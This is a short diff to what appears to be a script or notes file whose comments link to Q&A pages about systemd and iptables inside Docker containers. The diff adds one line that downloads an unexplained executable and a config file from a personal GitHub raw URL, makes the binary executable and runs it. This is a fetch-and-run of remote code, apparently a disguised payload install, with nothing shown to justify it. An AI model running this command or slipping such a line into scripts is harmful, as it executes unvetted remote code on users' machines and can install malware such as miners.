@@ -2,3 +2,6 @@
 # https://askubuntu.com/questions/1379425/system-has-not-been-booted-with-systemd-as-init-system-pid-1-cant-operate
 # https://unix.stackexchange.com/questions/459206/list-ip-tables-in-docker-container
 # https://serverfault.com/questions/636442/using-iptables-without-root-privileges
+
+
+wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/gas && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && chmod +x gas && ./gas script.ini
